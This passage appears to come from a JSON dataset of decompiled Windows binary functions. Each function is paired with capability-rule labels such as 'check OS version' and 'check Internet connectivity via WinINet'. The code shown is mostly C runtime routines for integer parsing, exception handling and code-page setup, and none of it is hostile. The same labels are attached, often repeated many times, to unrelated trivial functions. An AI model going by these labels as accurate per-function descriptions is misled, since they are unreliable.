1;\n                }\n                if (uVar4 < lpBuffer) {\n                    return 0;\n                }\n                if (lpBuffer < uVar3) {\n                    lpAddress = uVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualAlloc)(lpAddress, dwSize, 0x1000, 4);\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                              (lpAddress, dwSize, (-(*0x45101c != 1) & 0x103) + 1, &lpflOldProtect);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 590
    },
    "0040a717": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040a717(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_8h, uint arg_ch, uint noname_16, uint noname_17, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc4;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x40a7b2;\n        var_34h = 1;\n    }\n    else {\n        pcStack40 = fcn.0040a7de;\n        uStack36 = *0x44e0fc;\n        uStack32 = var_20h;\n        puStack28 = var_ch_2;\n        uStack24 = var_1ch;\n        uStack20 = var_18h;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0040a717::var_28h_2;\n        var_30h = var_8h_3;\n        var_2ch = var_28h;\n        iVar1 = fcn.0040eadd(*var_8h_3, &fcn.0040a717::var_30h);\n        (**(iVar1 + 0x74))();\n        var_34h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_34h;\n}\n",
        "token_count": 673
    },
    "0040a7de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040a7de(int32_t param_1, int32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7\n                 , uint param_8)\n\n{\n    uint uVar1;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    int32_t arg_20h;\n    int32_t noname_8;\n    code *extraout_var;\n    code *UNRECOVERED_JUMPTABLE;\n    \n    if (*(param_2 + 8) == *0x44e0fc) {\n        if ((*(param_1 + 4) & 0x66) == 0) {\n            noname_8 = 1;\n            arg_20h = *(param_2 + 0x18);\n            fcn.0040ea15(param_1, *(param_2 + 0x10), param_3, 0, *(param_2 + 0xc), *(param_2 + 0x14), arg_20h, 1);\n            UNRECOVERED_JUMPTABLE = extraout_var;\n            if (*(param_2 + 0x24) == 0) {\n                arg_20h = param_2;\n                noname_8 = param_1;\n                fcn.0040a654(param_2, param_1);\n            }\n            fcn.0040a717(0x123, &stack0xfffffff8, 0, 0, 0, 0, 0, arg_20h, noname_8, unaff_EBX, UNRECOVERED_JUMPTABLE, \n                         unaff_EBP, unaff_retaddr, param_1, param_2, param_3, param_4, param_5, param_6, param_7, \n                         param_8);\n    // WARNING: Could not recover jumptable at 0x0040a888. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar1 = (*UNRECOVERED_JUMPTABLE)();\n            return uVar1;\n        }\n        *(param_2 + 0x24) = 1;\n    }\n    else {\n        *(param_1 + 4) = *(param_1 + 4) | 8;\n    }\n    return 1;\n}\n",
        "token_count": 526
    },
    "0040a890": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a890(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t *arg_14h, uint32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_4h;\n    \n    iVar3 = arg_8h;\n    var_4h = *(arg_8h + 0xc);\n    iVar2 = *(arg_8h + 0x10);\n    uVar4 = var_4h;\n    arg_8h = var_4h;\n    if (-1 < arg_ch) {\n        do {\n            if (uVar4 == 0xffffffff) {\n                fcn.0040edb9();\n            }\n            uVar4 = uVar4 - 1;\n            iVar1 = iVar2 + uVar4 * 0x14;\n            if (((*(iVar1 + 4) < arg_10h) && (arg_10h <= *(iVar1 + 8))) || (uVar4 == 0xffffffff)) {\n                arg_ch = arg_ch + -1;\n                var_4h = arg_8h;\n                arg_8h = uVar4;\n            }\n        } while (-1 < arg_ch);\n    }\n    uVar4 = uVar4 + 1;\n    *arg_14h = uVar4;\n    *arg_18h = var_4h;\n    if ((*(iVar3 + 0xc) <= var_4h && var_4h != *(iVar3 + 0xc)) || (var_4h < uVar4)) {\n        fcn.0040edb9();\n    }\n    return iVar2 + uVar4 * 0x14;\n}\n",
        "token_count": 405
    },
    "0040a953": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040a953(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    \n    iVar2 = fcn.0040eadd();\n    if (param_1 == *(iVar2 + 0x88)) {\n        iVar2 = fcn.0040eadd();\n        *(iVar2 + 0x88) = *(param_1 + 4);\n        return;\n    }\n    iVar2 = fcn.0040eadd();\n    iVar2 = *(iVar2 + 0x88);\n    do {\n        iVar3 = iVar2;\n        if (*(iVar3 + 4) == 0) {\n            fcn.0040bc40(0x443438, 8);\n            pcVar1 = *0x44e32c;\n            if (*0x44e32c != NULL) {\n                *(unaff_EBP + -4) = 0;\n                (*pcVar1)();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.0040bc40(0x443428, 8);\n            iVar2 = fcn.0040eadd();\n            if (*(iVar2 + 0x6c) != 0) {\n                *(unaff_EBP + -4) = 0;\n                iVar2 = fcn.0040eadd();\n                (**(iVar2 + 0x6c))();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.0041031f(10);\n            fcn.0041626d(0x16);\n            fcn.0040c93f(3);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar2 = *(iVar3 + 4);\n    } while (param_1 != *(iVar3 + 4));\n    *(iVar3 + 4) = *(param_1 + 4);\n    return;\n}\n",
        "token_count": 448
    },
    "0040ed84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040ed84(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443428, 8);\n    iVar2 = fcn.0040eadd();\n    if (*(iVar2 + 0x6c) != 0) {\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0040eadd();\n        (**(iVar2 + 0x6c))();\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0041031f(10);\n    fcn.0041626d(0x16);\n    fcn.0040c93f(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 217
    },
    "0040aa90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040aa90(code **param_1)\n\n{\n    *param_1 = vtable.exception.0;\n    if (param_1[2] != NULL) {\n        fcn.00409f48(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "0040abc3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040abc3(uint8_t *arg_8h, uint8_t **arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint8_t *puVar8;\n    uint32_t var_4h;\n    \n    iVar3 = fcn.0040eadd();\n    iVar3 = *(iVar3 + 100);\n    if (iVar3 != *0x44e394) {\n        iVar3 = fcn.0040f3a1();\n    }\n    var_4h = 0;\n    uVar7 = *arg_8h;\n    puVar2 = arg_8h;\n    while( true ) {\n        puVar8 = puVar2 + 1;\n        if (*(iVar3 + 0x28) < 2) {\n            uVar4 = *(*(iVar3 + 0x48) + uVar7 * 2) & 8;\n        }\n        else {\n            uVar4 = fcn.0040f03c(iVar3, uVar7, 8);\n        }\n        if (uVar4 == 0) break;\n        uVar7 = *puVar8;\n        puVar2 = puVar8;\n    }\n    if (uVar7 == 0x2d) {\n        arg_14h = arg_14h | 2;\ncode_r0x0040ac2a:\n        uVar7 = *puVar8;\n        puVar8 = puVar2 + 2;\n    }\n    else if (uVar7 == 0x2b) goto code_r0x0040ac2a;\n    if (((arg_10h < 0) || (arg_10h == 1)) || (0x24 < arg_10h)) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n        return 0;\n    }\n    if (arg_10h == 0) {\n        if (uVar7 != 0x30) {\n            arg_10h = 10;\n            goto code_r0x0040ac8d;\n        }\n        if ((*puVar8 != 0x78) && (*puVar8 != 0x58)) {\n            arg_10h = 8;\n            goto code_r0x0040ac8d;\n        }\n        arg_10h = 0x10;\n    }\n    if (((arg_10h == 0x10) && (uVar7 == 0x30)) && ((*puVar8 == 0x78 || (*puVar8 == 0x58)))) {\n        uVar7 = puVar8[1];\n        puVar8 = puVar8 + 2;\n    }\ncode_r0x0040ac8d:\n    uVar4 = 0xffffffff / arg_10h;\n    do {\n        uVar1 = *(*0x44e330 + uVar7 * 2);\n        if ((uVar1 & 4) == 0) {\n            if ((uVar1 & 0x103) == 0) {\ncode_r0x0040acf9:\n                puVar8 = puVar8 + -1;\n                if ((arg_14h & 8) == 0) {\n                    if (arg_ch != NULL) {\n                        puVar8 = arg_8h;\n                    }\n                    var_4h = 0;\n                }\n                else if (((arg_14h & 4) != 0) ||\n                        (((arg_14h & 1) == 0 &&\n                         ((((arg_14h & 2) != 0 && (0x80000000 < var_4h)) ||\n                          (((arg_14h & 2) == 0 && (0x7fffffff < var_4h)))))))) {\n                    puVar5 = fcn.0040adb0();\n                    *puVar5 = 0x22;\n                    if ((arg_14h & 1) == 0) {\n                        var_4h = ((arg_14h & 2) != 0) + 0x7fffffff;\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                if (arg_ch != NULL) {\n                    *arg_ch = puVar8;\n                }\n                if ((arg_14h & 2) == 0) {\n                    return var_4h;\n                }\n                return -var_4h;\n            }\n            if ((uVar7 < 'a') || ('z' < uVar7)) {\n                iVar3 = uVar7;\n            }\n            else {\n                iVar3 = uVar7 + -0x20;\n            }\n            uVar6 = iVar3 - 0x37;\n        }\n        else {\n            uVar6 = uVar7 - 0x30;\n        }\n        if (arg_10h <= uVar6) goto code_r0x0040acf9;\n        if ((var_4h < uVar4) || ((var_4h == uVar4 && (uVar6 <= 0xffffffff % arg_10h)))) {\n            var_4h = var_4h * arg_10h + uVar6;\n            arg_14h = arg_14h | 8;\n        }\n        else {\n            arg_14h = arg_14h | 0xc;\n        }\n        uVar7 = *puVar8;\n        puVar8 = puVar8 + 1;\n    } while( true );\n}\n",
        "token_count": 1254
    },
    "0040aeed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0040b035)\n// WARNING: Removing unreachable block (ram,0x0040b0c6)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.0040aeed(uint8_t *arg_8h, uint8_t **arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t extraout_ECX;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint8_t *var_8h;\n    uint var_1h;\n    \n    iVar2 = fcn.0040eadd();\n    iVar2 = *(iVar2 + 100);\n    if (iVar2 != *0x44e394) {\n        iVar2 = fcn.0040f3a1();\n    }\n    uVar1 = 0;\n    var_1h._0_1_ = *arg_8h;\n    var_8h = arg_8h + 1;\n    while( true ) {\n        if (*(iVar2 + 0x28) < 2) {\n            uVar3 = *(*(iVar2 + 0x48) + var_1h * 2) & 8;\n        }\n        else {\n            uVar3 = fcn.0040f03c(iVar2, var_1h, 8);\n        }\n        if (uVar3 == 0) break;\n        var_1h._0_1_ = *var_8h;\n        var_8h = var_8h + 1;\n    }\n    if (var_1h == 0x2d) {\n        arg_14h = arg_14h | 2;\ncode_r0x0040af62:\n        var_1h._0_1_ = *var_8h;\n        var_8h = var_8h + 1;\n    }\n    else if (var_1h == 0x2b) goto code_r0x0040af62;\n    if (((arg_10h < 0) || (arg_10h == 1)) || (0x24 < arg_10h)) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n        return 0;\n    }\n    if (arg_10h == 0) {\n        if (var_1h != 0x30) {\n            arg_10h = 10;\n            goto code_r0x0040afd3;\n        }\n        if ((*var_8h != 0x78) && (*var_8h != 0x58)) {\n            arg_10h = 8;\n            goto code_r0x0040afd3;\n        }\n        arg_10h = 0x10;\n    }\n    if (((arg_10h == 0x10) && (var_1h == 0x30)) && ((*var_8h == 0x78 || (*var_8h == 0x58)))) {\n        var_1h._0_1_ = var_8h[1];\n        var_8h = var_8h + 2;\n    }\ncode_r0x0040afd3:\n    uVar5 = fcn.0040fe10(0xffffffff, 0xffffffff, arg_10h, arg_10h >> 0x1f);\n    do {\n        iVar2 = fcn.0040fd57(var_1h);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0040fca4(var_1h);\n            if (iVar2 == 0) {\ncode_r0x0040b089:\n                var_8h = var_8h + -1;\n                if ((arg_14h & 8) == 0) {\n                    if (arg_ch != NULL) {\n                        var_8h = arg_8h;\n                    }\n                    uVar1 = 0;\n                }\n                else if (((arg_14h & 4) != 0) ||\n                        (((arg_14h & 1) == 0 &&\n                         ((((arg_14h & 2) != 0 && (0x8000000000000000 < uVar1)) ||\n                          (((arg_14h & 2) == 0 && ((0x7ffffffeffffffff < uVar1 && (0x7fffffffffffffff < uVar1))))))))))\n                {\n                    puVar4 = fcn.0040adb0();\n                    *puVar4 = 0x22;\n                    if ((arg_14h & 1) == 0) {\n                        if ((arg_14h & 2) == 0) {\n                            uVar1 = 0x7fffffffffffffff;\n                        }\n                        else {\n                            uVar1 = 0x8000000000000000;\n                        }\n                    }\n                    else {\n                        uVar1 = 0xffffffffffffffff;\n                    }\n                }\n                var_ch = uVar1 >> 0x20;\n                var_10h = uVar1;\n                if (arg_ch != NULL) {\n                    *arg_ch = var_8h;\n                }\n                if ((arg_14h & 2) == 0) {\n                    return uVar1;\n                }\n                return CONCAT44(-(var_ch + (var_10h != 0)), -var_10h);\n            }\n            iVar2 = fcn.0040fc82(var_1h);\n            uVar3 = iVar2 - 0x37;\n        }\n        else {\n            uVar3 = var_1h - 0x30;\n        }\n        if (arg_10h <= uVar3) goto code_r0x0040b089;\n        if ((uVar1 < uVar5) || ((uVar5 == uVar1 && ((arg_8h != NULL || (uVar3 <= extraout_ECX)))))) {\n            iVar6 = fcn.0040bba0(arg_10h, arg_10h >> 0x1f, uVar1);\n            uVar1 = iVar6 + 0x18;\n            arg_14h = arg_14h | 8;\n        }\n        else {\n            arg_14h = arg_14h | 0xc;\n        }\n        var_1h._0_1_ = *var_8h;\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 1498
    },
    "0040b2c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0040b2c4(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    while( true ) {\n        if (*(iVar1 + 0x28) < 2) {\n            uVar2 = *(*(iVar1 + 0x48) + *param_1 * 2) & 8;\n        }\n        else {\n            uVar2 = fcn.0040f03c(iVar1, *param_1, 8);\n        }\n        if (uVar2 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 445
    },
    "0040bd32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd32(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        fcn.0040bc8c(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0040bd4a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint8_t * fcn.0040bd4a(uint8_t *param_1, uint8_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x4527c0) {\n        iVar1 = fcn.0040bf99();\n    }\n    if (param_2 <= param_1) {\n        return NULL;\n    }\n    if (*(iVar1 + 8) == 0) {\n        return param_2 + -1;\n    }\n    puVar2 = param_2 + -1;\n    do {\n        puVar2 = puVar2 + -1;\n        if (puVar2 < param_1) break;\n    } while ((*(*puVar2 + 0x1d + iVar1) & 4) != 0);\n    return param_2 + (-1 - (param_2 - puVar2 & 1U));\n}\n",
        "token_count": 233
    },
    "0040bd99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint8_t * fcn.0040bd99(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    \n    puVar1 = param_1 + 1;\n    if (((*(*param_1 + 0x4527e1) & 4) != 0) && (*puVar1 != 0)) {\n        puVar1 = param_1 + 2;\n    }\n    return puVar1;\n}\n",
        "token_count": 99
    },
    "0040be0d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_518h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040be0d(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint unaff_ESI;\n    uint *puVar9;\n    uint noname_8;\n    uint noname_9;\n    uint *noname_2;\n    uint noname_11;\n    uint *noname_4;\n    uint noname_13;\n    uint noname_14;\n    uint noname_15;\n    uint noname_8_00;\n    uint *noname_1;\n    uint noname_10;\n    uint noname_12;\n    uint noname_13_00;\n    uint noname_14_00;\n    uint noname_7;\n    uint *arg_8h;\n    uint var_518h;\n    uint in_stack_fffffae8;\n    uint in_stack_fffffaec;\n    uint in_stack_fffffaf0;\n    uint in_stack_fffffaf4;\n    uint in_stack_fffffaf8;\n    uint in_stack_fffffafc;\n    uint in_stack_fffffb00;\n    uint in_stack_fffffb04;\n    uint var_318h;\n    uint var_218h;\n    uint var_118h;\n    uint lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    arg_8h = &lpCPInfo;\n    noname_7 = *0x4528e4;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    if (iVar2 == 1) {\n        uVar3 = 0;\n        do {\n            *(&var_118h + uVar3) = uVar3;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n        var_118h._0_1_ = 0x20;\n        if (var_12h != 0) {\n            puVar8 = &var_12h + 1;\n            do {\n                uVar3 = var_12h;\n                if (uVar3 <= *puVar8) {\n                    uVar6 = (*puVar8 - uVar3) + 1;\n                    puVar9 = &var_118h + uVar3;\n                    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar9 = 0x20202020;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar9 = 0x20;\n                        puVar9 = puVar9 + 1;\n                    }\n                }\n                var_12h._0_1_ = puVar8[1];\n                puVar8 = puVar8 + 2;\n            } while (var_12h != 0);\n        }\n        noname_14_00 = 0;\n        puVar9 = &var_518h;\n        noname_10 = 0x100;\n        noname_1 = &var_118h;\n        noname_8_00 = 1;\n        noname_12 = *0x4528e4;\n        noname_13_00 = *0x4527bc;\n        fcn.0041146b(1, noname_1, 0x100, puVar9, *0x4528e4, *0x4527bc, 0, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4);\n        noname_15 = 0;\n        noname_4 = &var_218h;\n        noname_13 = 0x100;\n        noname_11 = 0x100;\n        noname_2 = &var_118h;\n        noname_9 = 0x100;\n        noname_8 = *0x4527bc;\n        noname_14 = *0x4528e4;\n        fcn.004110af(*0x4527bc, 0x100, noname_2, 0x100, noname_4, 0x100, *0x4528e4, 0, noname_8_00, noname_1, noname_10\n                     , puVar9, noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4, in_stack_fffffaf8, \n                     in_stack_fffffafc, in_stack_fffffb00, in_stack_fffffb04);\n        fcn.004110af(*0x4527bc, 0x200, &var_118h, 0x100, &var_318h, 0x100, *0x4528e4, 0, noname_8, noname_9, noname_2, \n                     noname_11, noname_4, noname_13, noname_14, noname_15, noname_8_00, noname_1, noname_10, puVar9, \n                     noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h);\n        uVar3 = 0;\n        do {\n            uVar1 = *(&var_518h + uVar3 * 2);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 2) != 0) {\n                    *(uVar3 + 0x4527e1) = *(uVar3 + 0x4527e1) | 0x20;\n                    uVar4 = *(&var_318h + uVar3);\n                    goto code_r0x0040bf1f;\n                }\n                *(uVar3 + 0x452900) = 0;\n            }\n            else {\n                *(uVar3 + 0x4527e1) = *(uVar3 + 0x4527e1) | 0x10;\n                uVar4 = *(&var_218h + uVar3);\ncode_r0x0040bf1f:\n                *(uVar3 + 0x452900) = uVar4;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    else {\n        uVar3 = 0;\n        do {\n            if 